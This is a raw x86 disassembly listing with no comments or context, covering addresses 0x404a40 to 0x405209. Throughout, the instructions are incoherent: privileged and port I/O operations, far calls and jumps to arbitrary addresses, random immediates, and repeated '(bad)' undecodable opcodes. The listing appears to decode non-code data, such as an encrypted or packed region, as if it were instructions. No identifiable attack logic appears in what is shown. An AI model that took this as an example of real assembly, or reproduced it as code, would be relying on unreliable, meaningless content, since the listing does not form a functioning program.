  404a40:	sbb    dl,BYTE PTR [esi-0x7]
  404a43:	mov    edi,0x8b8f69df
  404a48:	aam    0xeb
  404a4a:	test   DWORD PTR [esi],0xbaa64acc
  404a50:	sbb    BYTE PTR [ebp+0x5b3b0cfd],dl
  404a56:	push   0xb
  404a58:	pushf  
  404a59:	jmp    0x404a87
  404a5b:	push   eax
  404a5c:	sbb    al,0x6a
  404a5e:	xchg   esp,esp
  404a60:	jl     0x4049fd
  404a62:	pop    edx
  404a63:	fwait
  404a64:	jae    0x404ada
  404a66:	xchg   edi,eax
  404a67:	mov    ds:0xfdc6b4e4,al
  404a6c:	call   0xbc6e:0x37830d77
  404a73:	push   0x4bca2ac4
  404a78:	xchg   edx,eax
  404a79:	pop    es
  404a7a:	mov    ebx,0xe725e5c0
  404a7f:	fwait
  404a80:	iret   
  404a81:	xchg   ebp,eax
  404a82:	dec    edi
  404a83:	mov    al,ds:0x90e54fe4
  404a88:	push   ss
  404a89:	pusha  
  404a8a:	pop    es
  404a8b:	inc    esi
  404a8c:	aaa    
  404a8d:	sub    DWORD PTR fs:[ebx],ebx
  404a90:	xchg   edi,eax
  404a91:	push   es
  404a92:	mov    cl,0x54
  404a94:	int3   
  404a95:	mov    ebx,0xe6f55643
  404a9a:	mov    dl,0x1
  404a9c:	add    eax,0x2e4a19d8
  404aa1:	shl    BYTE PTR [esi-0x277c1016],cl
  404aa7:	ss add dh,al
  404aaa:	loope  0x404a84
  404aac:	and    DWORD PTR [esp+eax*4+0x78],edi
  404ab0:	rcl    dh,1
  404ab2:	mov    esi,0x2c79e799
  404ab7:	mov    esp,0x52f49586
  404abc:	sbb    BYTE PTR [edi+0x13],al
  404abf:	int    0x8
  404ac1:	push   ebx
  404ac2:	stc    
  404ac3:	mov    edi,0x4d75840d
  404ac8:	ins    BYTE PTR es:[edi],dx
  404ac9:	fidivr WORD PTR [ebx]
  404acb:	out    dx,al
  404acc:	ret    0x5ce7
  404acf:	icebp  
  404ad0:	xchg   esi,eax
  404ad1:	add    BYTE PTR [edi],ah
  404ad3:	xor    edx,DWORD PTR [esi]
  404ad5:	xor    ecx,DWORD PTR [edi+0x56]
  404ad8:	call   0xc571:0x5798d81e
  404adf:	dec    ebp
  404ae0:	jecxz  0x404af1
  404ae2:	mov    eax,ds:0x2487af03
  404ae7:	out    dx,eax
  404ae8:	cmp    eax,0xd6d98f78
  404aed:	stc    
  404aee:	sti    
  404aef:	lock and cl,BYTE PTR [ebp-0x61ea52d2]
  404af6:	and    al,0xf6
  404af8:	fld    DWORD PTR [ebx-0x5b]
  404afb:	jmp    0xba7b:0x7adb97bc
  404b02:	sbb    dl,bh
  404b04:	fisub  DWORD PTR [edi-0x3f4023b]
  404b0a:	das    
  404b0b:	mov    ds:0x5468fde8,al
  404b10:	dec    eax
  404b11:	call   0x1ce2132b
  404b16:	dec    ecx
  404b17:	or     dh,0x8
  404b1a:	xchg   BYTE PTR [ebx-0x3e],bh
  404b1d:	cmp    ebx,esp
  404b1f:	xor    bh,dh
  404b21:	popa   
  404b22:	stos   BYTE PTR es:[edi],al
  404b23:	dec    esp
  404b24:	add    BYTE PTR [ebx-0x37],dh
  404b27:	mov    esp,0x3ca8e576
  404b2c:	xchg   ecx,eax
  404b2d:	jg     0x404b46
  404b2f:	mov    ebx,0xec35949c
  404b34:	mov    ds:0xd2faead4,al
  404b39:	xor    DWORD PTR [ebp+0x5441494c],esi
  404b3f:	and    DWORD PTR ds:0xe88fc26a,0xb4432c5
  404b49:	pop    ebx
  404b4a:	xchg   edi,eax
  404b4b:	test   dl,dh
  404b4d:	dec    eax
  404b4e:	aam    0x4b
  404b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b51:	inc    esp
  404b52:	stos   DWORD PTR es:[edi],eax
  404b53:	lods   eax,DWORD PTR ds:[esi]
  404b54:	xor    bh,dh
  404b56:	shr    DWORD PTR [edi+ecx*1],cl
  404b59:	xlat   BYTE PTR ds:[ebx]
  404b5a:	mov    dh,0xb9
  404b5c:	call   0xf22e:0x61c39a6c
  404b63:	in     al,dx
  404b64:	punpckldq mm7,DWORD PTR [edx]
  404b67:	mov    ebp,0xba5e0866
  404b6c:	cdq    
  404b6d:	cld    
  404b6e:	dec    esi
  404b6f:	lods   eax,DWORD PTR ds:[esi]
  404b70:	adc    edi,DWORD PTR [edx]
  404b72:	cmp    cl,BYTE PTR [ecx+0x48]
  404b75:	aam    0x27
  404b77:	dec    esp
  404b78:	mov    dl,0x6f
  404b7a:	mov    dl,BYTE PTR [edx]
  404b7c:	in     al,0xfe
  404b7e:	adc    BYTE PTR [esi+0x6e41dd29],al
  404b84:	adc    bl,BYTE PTR [ecx]
  404b86:	aam    0xff
  404b88:	lods   al,BYTE PTR ds:[esi]
  404b89:	in     eax,dx
  404b8a:	es aas 
  404b8c:	mov    cs,WORD PTR [ebp+0x5f023fbd]
  404b92:	cli    
  404b93:	mov    esi,0xb6ca0276
  404b98:	inc    edi
  404b99:	push   cs
  404b9a:	dec    edx
  404b9b:	jo     0x404b32
  404b9d:	cmp    esp,DWORD PTR [edx+0x5f612e47]
  404ba3:	or     ebx,DWORD PTR [eax-0x4ca55173]
  404ba9:	mov    al,ds:0xb75fa82c
  404bae:	add    DWORD PTR [esi],0xffffffe6
  404bb1:	mov    BYTE PTR [eax-0x3e],ch
  404bb4:	jl     0x404b8d
  404bb6:	and    eax,0x3b351fd2
  404bbb:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  404bbd:	inc    edx
  404bbe:	mov    ecx,0x92543059
  404bc3:	pop    ds
  404bc4:	in     eax,dx
  404bc5:	out    dx,al
  404bc6:	cs mov bl,0xda
  404bc9:	adc    al,0x1a
  404bcb:	out    dx,al
  404bcc:	icebp  
  404bcd:	shr    BYTE PTR [eax+0x79],cl
  404bd0:	add    BYTE PTR [ebp-0x53],ch
  404bd3:	(bad)
  404bd7:	fidivr DWORD PTR [eax-0x21]
  404bda:	jl     0x404b8d
  404bdc:	cld    
  404bdd:	push   esp
  404bde:	mov    ch,0x42
  404be0:	pusha  
  404be1:	pop    ebx
  404be2:	sub    DWORD PTR [edx+0x45],edi
  404be5:	xchg   ecx,esp
  404be7:	iret   
  404be8:	adc    eax,0x70ec9aa
  404bed:	fidiv  DWORD PTR es:[edi+0x1c71909b]
  404bf4:	pusha  
  404bf5:	or     al,0xa9
  404bf7:	shl    DWORD PTR [eax],0xdc
  404bfa:	mov    esi,0x42259912
  404bff:	jmp    0x230219c6
  404c04:	scas   eax,DWORD PTR es:[edi]
  404c05:	inc    ebx
  404c06:	sub    DWORD PTR [ebp-0x63],edi
  404c09:	ss clc 
  404c0b:	shr    BYTE PTR [edi+edx*2],0xff
  404c0f:	push   ebp
  404c10:	jl     0x404b9b
  404c12:	mov    esp,DWORD PTR [eax+0xbb8a74d]
  404c18:	xor    BYTE PTR [ebp+0x64cbbc06],dl
  404c1e:	ret    0x67ee
  404c21:	push   eax
  404c22:	pusha  
  404c23:	lods   al,BYTE PTR ds:[esi]
  404c24:	jbe    0x404c5a
  404c26:	mov    ds:0xddfde635,eax
  404c2b:	mov    edx,0xc88da179
  404c30:	cs xchg ebp,eax
  404c32:	stc    
  404c33:	mov    ch,0xbb
  404c35:	daa    
  404c36:	(bad)  
  404c38:	outs   dx,DWORD PTR ds:[esi]
  404c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c3a:	inc    ebp
  404c3b:	je     0x404c2d
  404c3d:	dec    esp
  404c3e:	xchg   edi,eax
  404c3f:	mov    bh,0x14
  404c41:	sbb    al,0x69
  404c43:	(bad)
  404c46:	scas   al,BYTE PTR es:[edi]
  404c47:	lods   eax,DWORD PTR ds:[esi]
  404c48:	mov    ds:0x7654ca73,eax
  404c4d:	dec    esp
  404c4e:	sti    
  404c4f:	ret    0x7963
  404c52:	push   esp
  404c53:	mov    ebx,0x14386fdb
  404c58:	pop    ss
  404c59:	aam    0x30
  404c5b:	test   BYTE PTR [esi+0x10210db],0xb8
  404c62:	ffreep st(5)
  404c64:	mov    ebp,esi
  404c66:	push   cs
  404c67:	inc    edi
  404c68:	shr    DWORD PTR [esi-0x228c0fe7],cl
  404c6e:	ins    BYTE PTR es:[edi],dx
  404c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c70:	rcl    bh,0x0
  404c73:	cmp    al,0xad
  404c75:	push   ebp
  404c76:	adc    DWORD PTR ds:0x3797e755,ecx
  404c7c:	aaa    
  404c7d:	xor    BYTE PTR [edi+0x21655204],ch
  404c83:	or     al,0x96
  404c85:	icebp  
  404c86:	push   ebx
  404c87:	pop    ds
  404c88:	xor    dh,BYTE PTR [ebx+eiz*4+0x218edba8]
  404c8f:	mov    ebp,0x70554c01
  404c94:	push   edx
  404c95:	adc    DWORD PTR [eax],esp
  404c97:	and    eax,DWORD PTR [esi+0x39]
  404c9a:	std    
  404c9b:	or     BYTE PTR [eax],0x7b
  404c9e:	fbstp  TBYTE PTR [ebx+ecx*2+0x7e]
  404ca2:	push   ss
  404ca3:	mul    BYTE PTR [edi+0x57]
  404ca6:	xlat   BYTE PTR ds:[ebx]
  404ca7:	or     BYTE PTR [edi-0x72910869],al
  404cad:	stos   BYTE PTR es:[edi],al
  404cae:	mov    eax,ds:0x726d1a1e
  404cb3:	jnp    0x404d1c
  404cb5:	sti    
  404cb6:	dec    edx
  404cb7:	jl     0x404ce8
  404cb9:	cmp    esi,esi
  404cbb:	int    0xc7
  404cbd:	pop    eax
  404cbe:	jl     0x404cc4
  404cc0:	xchg   ebp,eax
  404cc1:	adc    bl,BYTE PTR [edi+0x69]
  404cc4:	repnz cmp ch,ch
  404cc7:	sub    eax,0x40f63a32
  404ccc:	cdq    
  404ccd:	mov    ds:0x5a69f0f1,eax
  404cd2:	std    
  404cd3:	xor    esi,ebx
  404cd5:	ret    0xe5ae
  404cd8:	jecxz  0x404d04
  404cda:	and    edi,DWORD PTR [ebp+0x5039914]
  404ce0:	jnp    0x404d02
  404ce2:	pop    edi
  404ce3:	dec    ebp
  404ce4:	xchg   esp,eax
  404ce5:	dec    eax
  404ce6:	mov    edx,0xfe51f7da
  404ceb:	add    BYTE PTR [ebx+ecx*4+0x7],bh
  404cef:	xchg   ecx,eax
  404cf0:	mov    dh,0xbe
  404cf2:	or     eax,DWORD PTR [ecx]
  404cf4:	inc    esp
  404cf5:	adc    edi,DWORD PTR [esi-0x45]
  404cf8:	rep lods al,BYTE PTR ds:[esi]
  404cfa:	lods   eax,DWORD PTR ds:[esi]
  404cfb:	call   0xcb78:0x2af9816c
  404d02:	in     al,dx
  404d03:	adc    bh,ah
  404d05:	ins    DWORD PTR es:[edi],dx
  404d06:	jmp    0x2bb9:0x1ab2839c
  404d0d:	push   ds
  404d0e:	data16 ror BYTE PTR [eax+edi*2],0x33
  404d13:	div    BYTE PTR ds:0x5bf2afab
  404d19:	stos   BYTE PTR es:[edi],al
  404d1a:	or     al,0xa4
  404d1c:	sub    edx,DWORD PTR [edi-0x7f]
  404d1f:	out    dx,eax
  404d20:	leave  
  404d21:	jl     0x404d92
  404d23:	jae    0x404d90
  404d25:	pop    eax
  404d26:	in     al,0xf9
  404d28:	jb     0x404d48
  404d2a:	and    BYTE PTR [ebx+0x37b6a5ea],bl
  404d30:	mov    WORD PTR [edi],cs
  404d32:	rol    DWORD PTR [ebp-0x4b],cl
  404d35:	aaa    
  404d36:	dec    edx
  404d37:	mov    cl,0xb5
  404d39:	sbb    BYTE PTR [ecx+0xf938a13],al
  404d3f:	pushf  
  404d40:	leave  
  404d41:	je     0x404d02
  404d43:	mov    al,0xcf
  404d45:	fisubr WORD PTR [edi-0x10277c9d]
  404d4b:	stos   DWORD PTR es:[edi],eax
  404d4c:	push   es
  404d4d:	xchg   ebx,eax
  404d4e:	xlat   BYTE PTR ds:[ebx]
  404d4f:	out    0xd7,al
  404d51:	and    al,0x7f
  404d53:	mov    edi,0xcde3c608
  404d58:	cmp    bl,BYTE PTR [edx-0x6d]
  404d5b:	inc    eax
  404d5c:	iret   
  404d5d:	jmp    0x856:0x2e687262
  404d64:	xchg   ebx,eax
  404d65:	mov    ebp,esp
  404d67:	dec    edx
  404d68:	inc    eax
  404d69:	sbb    eax,0xed5aea8d
  404d6e:	mov    cl,BYTE PTR [ecx+0x75523abf]
  404d74:	rcl    ch,1
  404d76:	dec    eax
  404d77:	mov    dh,bl
  404d79:	inc    edx
  404d7a:	pop    ebp
  404d7b:	adc    al,0xc4
  404d7d:	cmp    BYTE PTR [edi+0x39],0x92
  404d81:	add    BYTE PTR [ecx+0x234d3e7f],ch
  404d87:	and    DWORD PTR [esi],ebp
  404d89:	cld    
  404d8a:	dec    ebx
  404d8b:	and    al,BYTE PTR [esi+eiz*2-0x8ced542]
  404d92:	loop   0x404dd2
  404d94:	imul   edx,esi,0xffffffb2
  404d97:	cmc    
  404d98:	sub    eax,0x93c9ed37
  404d9d:	push   ecx
  404d9e:	ds mov eax,0xb9377b9f
  404da4:	(bad)  
  404da5:	xor    DWORD PTR [ebx-0x17369cb0],edx
  404dab:	call   0x8a77c53d
  404db0:	inc    edi
  404db1:	arpl   WORD PTR [ecx-0x4e],dx
  404db4:	je     0x404e2c
  404db6:	and    al,0xe7
  404db8:	push   es
  404db9:	mov    dl,0xc5
  404dbb:	enter  0x19ea,0x33
  404dbf:	in     al,0xf
  404dc1:	xchg   ebx,eax
  404dc2:	arpl   WORD PTR [esi],si
  404dc4:	adc    eax,0xa6e85dc2
  404dc9:	clc    
  404dca:	mov    ah,0x28
  404dcc:	dec    ebp
  404dcd:	jae    0x404df9
  404dcf:	mov    cr3,ebp
  404dd2:	and    al,0x21
  404dd4:	mov    ah,0xa
  404dd6:	adc    al,0xb3
  404dd8:	arpl   WORD PTR [esi+0x768e269d],di
  404dde:	push   ebx
  404ddf:	hlt    
  404de0:	or     al,0x77
  404de2:	cmp    DWORD PTR [esi-0x7f],edi
  404de5:	xchg   DWORD PTR [ebx+0x6e5b59d2],eax
  404deb:	sbb    al,0xd5
  404ded:	mov    ds,WORD PTR [edi+0x5c19fa1a]
  404df3:	xor    BYTE PTR [edi],0x4
  404df6:	sahf   
  404df7:	or     ebx,eax
  404df9:	xor    al,0xd9
  404dfb:	rcl    DWORD PTR ds:0x856ba425,1
  404e01:	cmp    BYTE PTR [ecx+0x4c],ch
  404e04:	cdq    
  404e05:	add    al,0x47
  404e07:	and    dh,BYTE PTR [esi]
  404e09:	(bad)  
  404e0a:	loop   0x404e3e
  404e0c:	fucomp st(7)
  404e0e:	pop    ss
  404e0f:	ret    0xd6b0
  404e12:	call   0x9b63:0x7775335a
  404e19:	addr16 inc edx
  404e1b:	and    eax,DWORD PTR [edx-0x3a]
  404e1e:	dec    esp
  404e1f:	adc    esi,DWORD PTR [ebx-0x6db255cf]
  404e25:	xor    dl,BYTE PTR [ecx+0x558148b4]
  404e2b:	in     eax,dx
  404e2c:	pop    esi
  404e2e:	add    ebx,DWORD PTR [ebp-0x6d]
  404e31:	mov    al,0xfb
  404e33:	cmp    DWORD PTR [ecx],edx
  404e35:	data16 repz adc al,0xca
  404e39:	sub    edx,ebp
  404e3b:	lods   eax,DWORD PTR ds:[esi]
  404e3c:	and    BYTE PTR ds:[esi+edx*1+0x4a],0x6a
  404e42:	mov    ebx,0x10804769
  404e47:	cmc    
  404e48:	in     al,dx
  404e49:	adc    bh,ah
  404e4b:	mov    bl,0xf4
  404e4d:	mov    bh,0xdd
  404e4f:	or     bl,BYTE PTR [eax-0x37c40ee5]
  404e55:	scas   al,BYTE PTR es:[edi]
  404e56:	xchg   esp,eax
  404e57:	mov    ah,0x2a
  404e59:	dec    esi
  404e5a:	ins    BYTE PTR es:[edi],dx
  404e5b:	or     DWORD PTR [esi],esp
  404e5d:	(bad)  
  404e5e:	sbb    DWORD PTR [ebx],ecx
  404e60:	mov    ah,0x7d
  404e62:	clc    
  404e63:	sub    bl,dh
  404e65:	and    BYTE PTR [ebp+0x59],bl
  404e68:	mov    ds:0xe2fb91b4,eax
  404e6d:	icebp  
  404e6e:	out    0x16,eax
  404e70:	dec    eax
  404e71:	pop    esp
  404e72:	lds    esp,FWORD PTR [edi]
  404e74:	fcom   QWORD PTR [ebx-0x6b]
  404e77:	rol    DWORD PTR [eax-0x2b],0xa
  404e7b:	cmp    ch,BYTE PTR [eax]
  404e7d:	js     0x404e0f
  404e7f:	sub    ebx,edi
  404e81:	ja     0x404efa
  404e83:	xor    BYTE PTR [ebx-0x2c],ch
  404e86:	enter  0x50dd,0x5c
  404e8a:	jb     0x404eea
  404e8c:	inc    edi
  404e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e8e:	mov    ?,WORD PTR [esi-0x7f678dcc]
  404e94:	test   dl,dl
  404e96:	test   BYTE PTR [edx+0x7cb2956d],0x24
  404e9d:	mov    fs,WORD PTR [eax+0x51b1567a]
  404ea3:	aam    0x87
  404ea5:	shl    BYTE PTR [eax],cl
  404ea7:	outs   dx,DWORD PTR ds:[esi]
  404ea8:	das    
  404ea9:	sub    eax,0x72b53140
  404eae:	mov    eax,ds:0xbf4412ab
  404eb3:	test   eax,0xfb0ea118
  404eb8:	repz ret 0xdb03
  404ebc:	jnp    0x404ec9
  404ebe:	mov    dh,0xb2
  404ec0:	dec    ebx
  404ec1:	lock (bad) 
  404ec5:	les    ebp,FWORD PTR [eax+eiz*2]
  404ec8:	push   0xffffffdc
  404eca:	call   0x44fadf46
  404ecf:	mov    ds:0xbeb90013,eax
  404ed4:	jae    0x404f0a
  404ed6:	(bad)  
  404ed7:	or     cl,bh
  404ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eda:	sub    DWORD PTR [edi-0x4ebfad9f],0xffffff94
  404ee1:	mov    ds:0xa6dc0c0c,al
  404ee6:	das    
  404ee7:	out    0x85,eax
  404ee9:	push   ds
  404eea:	and    edi,edi
  404eec:	shr    DWORD PTR [ecx+0x66bf7638],1
  404ef2:	adc    ecx,ecx
  404ef4:	lds    eax,FWORD PTR [edx-0x32]
  404ef7:	push   es
  404ef8:	out    0xb1,eax
  404efa:	mov    al,bh
  404efc:	mov    cl,0x78
  404efe:	arpl   WORD PTR [ebp+0x2df67921],bx
  404f04:	xlat   BYTE PTR ds:[ebx]
  404f05:	das    
  404f06:	jg     0x404f6b
  404f08:	add    al,0x2b
  404f0a:	repnz inc edx
  404f0c:	enter  0xf898,0x5d
  404f10:	icebp  
  404f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f12:	and    esp,DWORD PTR [eax-0x2e]
  404f15:	xchg   esi,eax
  404f16:	mov    bl,0x4e
  404f18:	mov    eax,DWORD PTR [edi+0x54215940]
  404f1e:	sub    BYTE PTR [eax],al
  404f20:	mov    ebp,0x46115f8e
  404f25:	cs addr16 sbb al,ah
  404f29:	push   edx
  404f2a:	cli    
  404f2b:	xchg   ebp,eax
  404f2c:	mov    ch,BYTE PTR [ebx-0x35]
  404f2f:	(bad)  
  404f30:	shr    bl,cl
  404f32:	clc    
  404f33:	push   edi
  404f34:	xchg   ebp,eax
  404f35:	and    DWORD PTR [edi],0xffa2e9cc
  404f3b:	mov    al,ds:0x1460361
  404f40:	pop    ss
  404f41:	shr    DWORD PTR [edx+0x6c07987d],cl
  404f47:	push   esi
  404f48:	stc    
  404f49:	adc    eax,edi
  404f4b:	pop    ebx
  404f4c:	imul   BYTE PTR [ebp+edi*1+0x15]
  404f50:	push   ecx
  404f51:	in     eax,dx
  404f52:	loopne 0x404f3b
  404f54:	aaa    
  404f55:	repz jle 0x404f94
  404f58:	pop    edx
  404f59:	ficom  DWORD PTR ds:0xf0ff6be9
  404f5f:	mov    dl,0x6
  404f61:	pop    esi
  404f62:	stos   DWORD PTR es:[edi],eax
  404f63:	mov    eax,ds:0x8ff36ec9
  404f68:	neg    esp
  404f6a:	pop    eax
  404f6b:	out    0x9,eax
  404f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f6e:	adc    eax,0xcfb2aeb4
  404f73:	mov    esp,ss
  404f75:	or     ebp,DWORD PTR [esi]
  404f77:	neg    DWORD PTR [ebx+0x6c]
  404f7a:	test   al,0x85
  404f7c:	push   ds
  404f7d:	hlt    
  404f7e:	(bad)  
  404f7f:	imul   eax,DWORD PTR [eax-0x5d],0x60
  404f83:	retf   0x621e
  404f86:	mov    al,0x12
  404f88:	sub    DWORD PTR ds:0xa22ad6fd,edi
  404f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f8f:	jbe    0x80ae65a0
  404f95:	fist   WORD PTR [esi+0x3aad373f]
  404f9b:	or     eax,0xe765b8b1
  404fa0:	sbb    BYTE PTR [esi-0x623c687f],cl
  404fa6:	jle    0x404fa1
  404fa8:	xchg   edx,eax
  404fa9:	or     esi,DWORD PTR [ecx+0x777cf5dc]
  404faf:	sub    eax,0x52dc3f10
  404fb4:	cs repnz sbb eax,0xd948d2ac
  404fbb:	(bad)  
  404fbc:	repz jne 0x404f80
  404fbf:	cmp    ah,ah
  404fc1:	shr    BYTE PTR [eax],0x2f
  404fc4:	mov    dh,0x45
  404fc6:	iret   
  404fc7:	int    0x95
  404fc9:	sub    cl,BYTE PTR [edi]
  404fcb:	mov    esp,0xc8b7359d
  404fd0:	mov    es,WORD PTR [ecx]
  404fd2:	or     ecx,esi
  404fd4:	inc    esi
  404fd5:	push   ebx
  404fd6:	fstp   QWORD PTR [ebx+0x25f6d521]
  404fdc:	cli    
  404fdd:	ficomp WORD PTR [edx+0x49b3a899]
  404fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fe4:	or     DWORD PTR [ecx-0x6f],0x5ff4090b
  404feb:	ret    
  404fec:	cwde   
  404fed:	xor    esi,edx
  404fef:	test   eax,0x79414fa9
  404ff4:	call   0xe4eb:0x63a92028
  404ffb:	les    edi,FWORD PTR [ecx]
  404ffd:	push   ecx
  404ffe:	imul   BYTE PTR [ebx]
  405000:	sbb    BYTE PTR [eax],al
  405002:	outs   dx,DWORD PTR ds:[esi]
  405003:	mov    al,0x80
  405005:	iret   
  405006:	push   eax
  405007:	gs leave 
  405009:	stos   BYTE PTR es:[edi],al
  40500a:	mov    edi,0x61d7a976
  40500f:	repnz scas al,BYTE PTR es:[edi]
  405011:	mov    ah,0x6b
  405013:	(bad)
  405016:	adc    cl,BYTE PTR [ecx+0x1]
  405019:	(bad)  
  40501b:	mov    ecx,0xc852762b
  405020:	adc    al,0x25
  405022:	fadd   DWORD PTR [esi+0x32]
  405025:	(bad)  
  405026:	inc    ch
  405028:	lods   eax,DWORD PTR ds:[esi]
  405029:	fs push edi
  40502b:	retf   0x2293
  40502e:	ja     0x404fb3
  405030:	xor    al,0x43
  405032:	sub    bl,BYTE PTR [eax+edx*2]
  405035:	ror    BYTE PTR [ebp-0x41b75929],1
  40503b:	sub    BYTE PTR [ebx],ah
  40503d:	add    al,0x8f
  40503f:	mov    esp,0xf92a290c
  405044:	pusha  
  405045:	addr16 pop esp
  405047:	cdq    
  405048:	dec    ebx
  405049:	ret    
  40504a:	xor    bl,BYTE PTR [eax]
  40504c:	je     0x405067
  40504e:	pop    ebx
  40504f:	loopne 0x404fe1
  405051:	mov    edx,0xf677dbbe
  405056:	adc    al,0x4b
  405058:	xchg   ecx,eax
  405059:	jbe    0x405034
  40505b:	inc    ebx
  40505c:	into   
  40505d:	cdq    
  40505e:	and    al,cl
  405060:	cs cs inc eax
  405063:	pop    ebp
  405064:	mov    eax,ds:0x24b6cfe2
  405069:	int3   
  40506a:	sub    BYTE PTR [ebx+0x34],cl
  40506d:	push   ss
  40506e:	xor    DWORD PTR [edi+0x2],eax
  405071:	not    DWORD PTR [eax+0x6ad116c]
  405077:	cwde   
  405078:	push   esi
  405079:	xor    eax,0xb9dae3d5
  40507e:	cmp    eax,0xca5dc41c
  405083:	cmp    al,0x32
  405085:	push   ss
  405086:	sub    eax,0x297c9b06
  40508b:	ror    DWORD PTR [ecx],0x75
  40508e:	repz cmp dh,BYTE PTR [ecx-0x5e07f13e]
  405095:	adc    eax,0xe0b2fe73
  40509a:	retf   0xb11
  40509d:	cli    
  40509e:	mov    ebp,0xaaa35996
  4050a3:	ins    BYTE PTR es:[edi],dx
  4050a4:	jb     0x4050d7
  4050a6:	cs aas 
  4050a8:	retf   
  4050a9:	inc    ecx
  4050aa:	imul   esp,ebx,0x6b7f5130
  4050b0:	nop
  4050b1:	sub    DWORD PTR [edx],edx
  4050b3:	inc    edi
  4050b4:	repnz mov bh,0xa9
  4050b7:	repnz mov esp,esp
  4050ba:	xchg   esi,eax
  4050bb:	and    DWORD PTR [ebx+0x6a],edx
  4050be:	(bad)  
  4050bf:	cmp    BYTE PTR [ebx+0x9e2b0aa],dh
  4050c5:	repz pushw cs
  4050c8:	ins    BYTE PTR es:[edi],dx
  4050c9:	stos   BYTE PTR es:[edi],al
  4050ca:	pop    edi
  4050cb:	push   ecx
  4050cc:	jmp    0x405138
  4050ce:	imul   ebx,DWORD PTR [edx*1-0x3e7056e0],0xffffffa8
  4050d6:	push   esp
  4050d7:	arpl   WORD PTR [eax],si
  4050d9:	pop    ds
  4050da:	pop    ebp
  4050db:	add    al,0x1f
  4050dd:	push   esp
  4050de:	test   BYTE PTR [ecx+ecx*1-0x3],ah
  4050e2:	aaa    
  4050e3:	scas   al,BYTE PTR es:[edi]
  4050e4:	fisttp DWORD PTR [ecx]
  4050e6:	call   0x9be0dd2
  4050eb:	nop
  4050ec:	aas    
  4050ed:	repnz inc DWORD PTR [eax]
  4050f0:	add    al,0x23
  4050f2:	inc    edx
  4050f3:	sbb    DWORD PTR [edi+eiz*4],eax
  4050f6:	in     al,dx
  4050f7:	lock mov ecx,0x7169419e
  4050fd:	lds    edx,FWORD PTR [ebx]
  4050ff:	pop    ecx
  405100:	scas   eax,DWORD PTR es:[edi]
  405101:	sbb    bh,BYTE PTR [ebx+0x4e1e745d]
  405107:	dec    BYTE PTR fs:[eax+0x22]
  40510b:	xor    ch,BYTE PTR [esi]
  40510d:	xchg   BYTE PTR [ecx-0xf],al
  405110:	xor    dh,BYTE PTR [edx]
  405112:	and    bl,ch
  405114:	mov    WORD PTR [ebx-0x66c1406d],?
  40511a:	dec    ebp
  40511b:	call   0x2feb:0x260d6528
  405122:	push   ecx
  405123:	push   eax
  405124:	jle    0x405142
  405126:	sub    edx,DWORD PTR [edx+eiz*4+0x7e]
  40512a:	cmp    BYTE PTR [esi],bl
  40512c:	ja     0x40519f
  40512e:	pop    esp
  40512f:	mov    ch,0x54
  405131:	jno    0x40519e
  405133:	cli    
  405134:	mov    DWORD PTR [edx+0xaf69ed8],esi
  40513a:	add    ebx,0xf5efbfa1
  405140:	push   edi
  405141:	pop    ebx
  405142:	or     bl,BYTE PTR [ebx+ebp*2]
  405145:	fucomi st,st(7)
  405147:	out    0xb,al
  405149:	jbe    0x4050cd
  40514b:	mov    BYTE PTR [eax+0x47bfee66],cl
  405151:	jae    0x4051ab
  405153:	mov    ss:0x9ceb889,eax
  405159:	daa    
  40515a:	or     BYTE PTR [esi+0x71cb5601],al
  405160:	cli    
  405161:	iret   
  405162:	in     eax,0x1f
  405164:	mov    ds:0x3a3967f2,al
  405169:	pop    ebp
  40516a:	xchg   ecx,eax
  40516b:	xchg   edi,eax
  40516c:	test   eax,0xffb8878c
  405171:	dec    ebp
  405172:	pop    esi
  405173:	sub    BYTE PTR [ebx-0x3349a553],dh
  405179:	mov    dh,0x85
  40517b:	inc    ebx
  40517c:	cmc    
  40517d:	add    al,0xc0
  40517f:	lock mov bh,0x1e
  405182:	cmp    bh,BYTE PTR [eax-0x17267f5b]
  405188:	ins    DWORD PTR es:[edi],dx
  405189:	int3   
  40518a:	mov    cl,0x34
  40518c:	and    al,BYTE PTR [eax+edi*1-0x3b]
  405190:	fidiv  WORD PTR [edi-0x4f]
  405193:	jl     0x4051f5
  405195:	call   0x6ae15429
  40519a:	push   0x21
  40519c:	sbb    eax,0x9bd6cbcc
  4051a1:	je     0x40515b
  4051a3:	xchg   esp,eax
  4051a4:	inc    edx
  4051a5:	push   cs
  4051a6:	adc    eax,0x142e3024
  4051ab:	adc    cl,0x92
  4051ae:	mul    bl
  4051b0:	jae    0x4051f0
  4051b2:	out    dx,al
  4051b3:	sbb    eax,0x31ac72b1
  4051b8:	js     0x405184
  4051ba:	sub    BYTE PTR [ebx],bh
  4051bc:	adc    bl,BYTE PTR [ecx]
  4051be:	jo     0x40515b
  4051c0:	(bad)  
  4051c1:	leave  
  4051c2:	call   0xaf3c:0x71b700a8
  4051c9:	sub    esi,ebx
  4051cb:	push   ebx
  4051cc:	pop    es
  4051cd:	ins    BYTE PTR es:[edi],dx
  4051ce:	jae    0x4051ed
  4051d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051d1:	jmp    0xcfebca0
  4051d6:	xor    BYTE PTR [ebp-0x76d9265e],dl
  4051dc:	adc    al,BYTE PTR [ebx-0x71]
  4051df:	lods   al,BYTE PTR ds:[esi]
  4051e0:	jp     0x405210
  4051e2:	jge    0x4051de
  4051e4:	jne    0x4051e0
  4051e6:	push   edx
  4051e7:	test   eax,0x711fc1c6
  4051ec:	in     al,dx
  4051ed:	xchg   edx,eax
  4051ef:	pop    ebx
  4051f0:	arpl   WORD PTR [esi+0x1d],si
  4051f3:	mov    BYTE PTR [edx+0x9d7e83],bh
  4051f9:	jae    0x405203
  4051fb:	rcl    BYTE PTR [esi],cl
  4051fd:	(bad)  [eax]
  4051ff:	push   eax
  405200:	pop    es
  405201:	add    dl,al
  405203:	push   esp
  405204:	sbb    bl,cl
  405206:	dec    edx
  405207:	or     al,0x91
  405209:	push   ds
